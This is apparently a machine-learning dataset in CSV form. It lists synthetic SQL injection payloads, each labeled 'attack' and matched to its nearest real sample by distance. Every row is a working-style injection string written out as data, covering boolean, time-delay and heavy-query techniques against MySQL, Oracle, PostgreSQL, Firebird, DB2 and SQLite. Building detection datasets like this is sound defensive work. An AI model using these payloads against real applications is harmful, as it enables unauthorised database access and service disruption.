id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000136,attack,boolean,"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'dfsj'  =  'dfsj",nearest_attack_euclidean,R001006,6.677319933393194
CTGAN_000137,attack,boolean,"1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000212,6.02781966172606
CTGAN_000138,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",nearest_attack_euclidean,R001224,4.077803114635594
CTGAN_000139,attack,boolean,-2929'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'nzmk'  =  'nzmk,nearest_attack_euclidean,R001143,4.28550456967427
CTGAN_000140,attack,boolean,"1""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""dwpa""  =  ""dwpa",nearest_attack_euclidean,R001411,5.642462266346573
CTGAN_000141,attack,boolean,"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  # dbzk",nearest_attack_euclidean,R001339,5.64776380844597
CTGAN_000142,attack,boolean,1'  )   and   (  3020  =  3020  )  *6703 and   (  'botl' like 'botl,nearest_attack_euclidean,R001377,6.229349895848695
CTGAN_000143,attack,boolean,1   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   6406  =  6406,nearest_attack_euclidean,R000126,6.206179055946479
CTGAN_000144,attack,boolean,"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001174,6.045639756686894
CTGAN_000145,attack,boolean,"-4327"" or make_set  (  3107  =  1781,1781  )   and ""lclf"" like ""lclf",nearest_attack_euclidean,R000864,4.70884926301476
CTGAN_000146,attack,boolean,-4082   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   7874  =  7874,nearest_attack_euclidean,R000171,5.665866646690303
CTGAN_000147,attack,boolean,"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000391,6.478140576356571
CTGAN_000148,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  3876  =  2077  )   then 1 else 0x28 end   )    )    and    (    (   'hqcz' like 'hqcz,nearest_attack_euclidean,R001219,4.666618856853542
CTGAN_000149,attack,boolean,-2303'   )    )    as exyt where 2528  =  2528 or 8571  =  8571--,nearest_attack_euclidean,R000889,4.678608134618013
CTGAN_000150,attack,boolean,"1'   )    )    as qhpv where 7049  =  7049 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R001119,4.671948197306322
CTGAN_000151,attack,boolean,"1%""   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000216,7.310620907923626
CTGAN_000152,attack,boolean,1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  1073  =  1073,nearest_attack_euclidean,R001240,3.983110036029842
CTGAN_000153,attack,boolean,"-8777""  )   as lalf where 8606  =  8606 or elt  (  4397  =  5823,5823  )  --",nearest_attack_euclidean,R000321,5.424228826863008
CTGAN_000154,attack,boolean,"1""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001213,5.737439047151215
CTGAN_000155,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R001012,4.91780665298978
CTGAN_000156,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",nearest_attack_euclidean,R000125,6.202456199502172
CTGAN_000157,attack,boolean,1'||  (  select 'vxfx' where 7038  =  7038 and 9306  =  4187  )  ||',nearest_attack_euclidean,R000302,6.5609829416921706
CTGAN_000158,attack,boolean,"1%'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000205,4.309169030438259
CTGAN_000159,attack,boolean,"-7843' where 5986  =  5986 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R001378,6.617817824249931
CTGAN_000160,attack,boolean,"1'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000610,4.493037244993977
CTGAN_000161,attack,boolean,1'+  (  select bfeq where 3445  =  3445 and 9198  =  9198--,nearest_attack_euclidean,R001492,4.684548498950978
CTGAN_000162,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R001516,6.716011271937132
CTGAN_000163,attack,boolean,"1""  )   and make_set  (  4553  =  8132,8132  )   and   (  ""pfci"" like ""pfci",nearest_attack_euclidean,R001453,4.514760065001956
CTGAN_000164,attack,boolean,"1  )   where 7199  =  7199 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000155,7.507445559761358
CTGAN_000165,attack,boolean,"1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R000809,6.86033754075362
CTGAN_000166,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000837,6.948567823201292
CTGAN_000167,attack,boolean,"1"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""fqeu"" like ""fqeu",nearest_attack_euclidean,R001149,5.131235916221917
CTGAN_000168,attack,boolean,select * from users where id  =  1 *1 or 1  =  1 -- 1,nearest_attack_euclidean,R000043,5.921518883098874
CTGAN_000169,attack,boolean,1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  1073  =  1073,nearest_attack_euclidean,R001240,7.582556355408256
CTGAN_000170,attack,boolean,"1""  )   as cxwd where 5800  =  5800 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000892,6.613156786474878
CTGAN_000171,attack,boolean,"1""   )    )    as femc where 1313  =  1313 and 4595  =  4595#",nearest_attack_euclidean,R000593,5.714257607542078
CTGAN_000172,attack,boolean,1   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  2197  =  2197,nearest_attack_euclidean,R000661,4.801591413193612
CTGAN_000173,attack,boolean,"-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715",nearest_attack_euclidean,R000415,4.583132318880022
CTGAN_000174,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000316,6.347339718658784
CTGAN_000175,attack,boolean,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  ",nearest_attack_euclidean,R000770,3.5137709287977357
CTGAN_000176,attack,boolean,"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  # dbzk",nearest_attack_euclidean,R001339,6.4463572848593
CTGAN_000177,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  3770  =  3770",nearest_attack_euclidean,R000612,4.7384071799727465
CTGAN_000178,attack,boolean,"1%'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R001150,4.747650527770204
CTGAN_000179,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000495,4.0709352920870865
CTGAN_000180,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000536,4.085093519368328
CTGAN_000181,attack,boolean,"1   )    )    as tuxy where 6855  =  6855 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000301,4.900868314307297
CTGAN_000182,attack,boolean,-6200%'   )    )    or 8077  =  4661,nearest_attack_euclidean,R000191,5.29163715872338
CTGAN_000183,attack,boolean,"1'+  (  select 'qzcx' where 9524  =  9524 and elt  (  3069  =  8430,8430   )    )   +'",nearest_attack_euclidean,R000723,5.953573480151762
CTGAN_000184,attack,boolean,1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'rgyc'  =  'rgyc,nearest_attack_euclidean,R001183,4.512102769578581
CTGAN_000185,attack,boolean,"1' in boolean mode  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000517,4.251727493245425
CTGAN_000186,attack,boolean,"1%'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001206,6.675392972484095
CTGAN_000187,attack,boolean,"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  # dbzk",nearest_attack_euclidean,R001339,5.8367847895471066
CTGAN_000188,attack,boolean,"-7551 or elt  (  6900  =  7195,7195  )  ",nearest_attack_euclidean,R000971,3.904467128086908
CTGAN_000189,attack,boolean,"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",nearest_attack_euclidean,R000396,6.2017691512089534
CTGAN_000190,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,5.40600468182499
CTGAN_000191,attack,boolean,"1' in boolean mode  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000925,5.776071654011746
CTGAN_000192,attack,boolean,"1' where 1836  =  1836 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000238,4.513709515238358
CTGAN_000193,attack,boolean,"1   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  6578  =  6578",nearest_attack_euclidean,R001524,5.943915030965037
CTGAN_000194,attack,boolean,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R001315,5.7604586279053525
CTGAN_000195,attack,boolean,1'||  (  select 'pcps' from dual where 7255  =  7255 and 7121  =  4603,nearest_attack_euclidean,R001373,4.814894844857992
CTGAN_000196,attack,boolean,"1'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'viad' like 'viad",nearest_attack_euclidean,R001308,6.399150209492442
CTGAN_000197,attack,boolean,1'+  (  select nsri where 1202  =  1202 and 4595  =  4595#,nearest_attack_euclidean,R001527,5.622829120992823
CTGAN_000198,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'xori' like 'xori",nearest_attack_euclidean,R000564,5.1279299908605545
CTGAN_000199,attack,boolean,"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001174,6.572888660059287
CTGAN_000200,attack,boolean,1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- izad,nearest_attack_euclidean,R000516,3.4951491670527575
CTGAN_000201,attack,boolean,"1   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000457,6.432397932265098
CTGAN_000202,attack,boolean,"1'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000610,7.420571679543256
CTGAN_000203,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R001516,7.062053852463712
CTGAN_000204,attack,boolean,"-7329""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""borw"" like ""borw",nearest_attack_euclidean,R000554,5.282099853291427
CTGAN_000205,attack,boolean,"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  4003  =  4003",nearest_attack_euclidean,R000899,7.280372886572394
CTGAN_000206,attack,boolean,"1 where 5099  =  5099 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R001135,4.855139208305888
CTGAN_000207,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000494,4.463542258826526
CTGAN_000208,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000536,4.565294636886059
CTGAN_000209,attack,boolean,"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001174,5.019472742935587
CTGAN_000210,attack,boolean,-5615'  )   where 5931  =  5931 or 8450  =  9229,nearest_attack_euclidean,R001415,5.2038575741503434
CTGAN_000211,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000774,4.886364015637431
CTGAN_000212,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R001155,5.887131951025698
CTGAN_000213,attack,boolean,"1' in boolean mode  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",nearest_attack_euclidean,R000146,6.16641949430754
CTGAN_000214,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R001155,3.6459842900181387
CTGAN_000215,attack,boolean,"1%""   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000361,4.593555952303769
CTGAN_000216,attack,boolean,"1'   )    )    as qhpv where 7049  =  7049 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R001119,2.7817058745844676
CTGAN_000217,attack,boolean,-4389'   )    )     )   or   (  1139  =  3499  )  *3499 and    (    (     (  'qoch'  =  'qoch,nearest_attack_euclidean,R001501,6.397437199405464
CTGAN_000218,attack,boolean,"1'  )   as elnu where 5719  =  5719 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001408,5.1414301712651636
CTGAN_000219,attack,boolean,"1   )    )     )   and make_set  (  8882  =  1593,1593  )   and    (    (     (  7989  =  7989",nearest_attack_euclidean,R001249,6.37179265571739
CTGAN_000220,attack,boolean,"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh",nearest_attack_euclidean,R001489,7.219396511947377
CTGAN_000221,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000536,4.93294089750066
CTGAN_000222,attack,boolean,-9363%' or   (  8459  =  8459  )  *4906 and '%'  =  ',nearest_attack_euclidean,R000400,5.869953928978208
CTGAN_000223,attack,boolean,"1   )    )    as oqfr where 6426  =  6426 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000473,5.059648317586315
CTGAN_000224,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R001516,6.795590879031996
CTGAN_000225,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000316,3.9512831730482336
CTGAN_000226,attack,boolean,"1'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'rqbf'  =  'rqbf",nearest_attack_euclidean,R000411,4.835444273029631
CTGAN_000227,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R001155,5.768748637217409
CTGAN_000228,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R001305,5.853192085511838
CTGAN_000229,attack,boolean,"1'  )   as ssxj where 3845  =  3845 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R001268,5.06723133932584
CTGAN_000230,attack,boolean,"1%"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001207,6.695149923796381
CTGAN_000231,attack,boolean,1'+  (  select bfeq where 3445  =  3445 and 9198  =  9198--,nearest_attack_euclidean,R001492,6.618882373337293
CTGAN_000232,attack,boolean,"1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000347,5.589946255834994
CTGAN_000233,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001211,6.754287373952252
CTGAN_000234,attack,boolean,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""sckh""  =  ""sckh",nearest_attack_euclidean,R000512,7.161252787029276
CTGAN_000235,attack,boolean,"-5027%""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001053,5.346068879511972
CTGAN_000236,attack,boolean,"1%'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000205,4.840986377048419
CTGAN_000237,attack,boolean,"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  # dbzk",nearest_attack_euclidean,R001339,6.154539669204168
CTGAN_000238,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R001516,4.490791693402288
CTGAN_000239,attack,boolean,"-3472' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",nearest_attack_euclidean,R000973,6.504079235111339
CTGAN_000240,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R001155,4.224007072466377
CTGAN_000241,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001211,6.169020598199268
CTGAN_000242,attack,boolean,"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""cdai""  =  ""cdai",nearest_attack_euclidean,R001460,5.185513385876996
CTGAN_000243,attack,boolean,1'   )    )    as cyom where 2318  =  2318 and 7533  =  7533--,nearest_attack_euclidean,R001103,3.656969879679153
CTGAN_000244,attack,boolean,"1' and make_set  (  8403  =  8403,8899  )  ",nearest_attack_euclidean,R000463,4.11364262855689
CTGAN_000245,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  '%'  =  '",nearest_attack_euclidean,R001332,6.7246525287982815
CTGAN_000246,attack,boolean,"-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715",nearest_attack_euclidean,R000415,5.0035738488975445
CTGAN_000247,attack,boolean,"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",nearest_attack_euclidean,R000710,5.341672386491953
CTGAN_000248,attack,boolean,"-1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000577,4.230508473828745
CTGAN_000249,attack,boolean,"1'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'viad' like 'viad",nearest_attack_euclidean,R001308,7.232156141445341
CTGAN_000250,attack,boolean,-9311   )    )    or   (  5065  =  2572  )  *2572 and    (    (   1199  =  1199,nearest_attack_euclidean,R000541,6.452349763338799
CTGAN_000251,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000426,6.997379374987681
CTGAN_000252,attack,boolean,"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'gmbd'  =  'gmbd",nearest_attack_euclidean,R000870,4.915491934292449
CTGAN_000253,attack,boolean,"1' where 8749  =  8749 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000166,5.842008898624846
CTGAN_000254,attack,boolean,"-6014"" or make_set  (  3003  =  2609,2609  )  ",nearest_attack_euclidean,R001062,5.917671901646497
CTGAN_000255,attack,boolean,"1""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ksxz""  =  ""ksxz",nearest_attack_euclidean,R001428,6.298627119421312
CTGAN_000256,attack,boolean,"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",nearest_attack_euclidean,R000710,6.75958640089429
CTGAN_000257,attack,boolean,"-5644""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""evcf""  =  ""evcf",nearest_attack_euclidean,R000278,6.824317112019937
CTGAN_000258,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000494,5.751675129972211
CTGAN_000259,attack,boolean,"1'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'viad' like 'viad",nearest_attack_euclidean,R001308,5.7401464203860835
CTGAN_000260,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,6.735418323365132
CTGAN_000261,attack,boolean,"1""  )   as kdvb where 2651  =  2651 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",nearest_attack_euclidean,R000627,5.249173230640181
CTGAN_000262,attack,boolean,select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000088,5.0420753502767965
CTGAN_000263,attack,boolean,1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,nearest_attack_euclidean,R001161,7.391897598917116
CTGAN_000264,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R001358,6.63361041337145
CTGAN_000265,attack,boolean,"1'||  (  select 'ryom' where 1134  =  1134 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000582,6.018085767572307
CTGAN_000266,attack,boolean,""" or true--",nearest_attack_euclidean,R000036,7.768775805379222
CTGAN_000267,attack,boolean,"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb",nearest_attack_euclidean,R000203,6.783144115313363
CTGAN_000268,attack,boolean,"1' in boolean mode  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000517,4.672599626797299
CTGAN_000269,attack,boolean,"1""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000628,5.849228521494789
CTGAN_000270,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'lwrk' like 'lwrk",nearest_attack_euclidean,R001521,4.841584072136979
CTGAN_000271,attack,boolean,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001321,4.167823161962232
CTGAN_000272,attack,boolean,"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",nearest_attack_euclidean,R000396,4.640533767761621
CTGAN_000273,attack,boolean,"-7528' or make_set  (  3809  =  1821,1821  )   and 'kgch'  =  'kgch",nearest_attack_euclidean,R000515,4.999760039540543
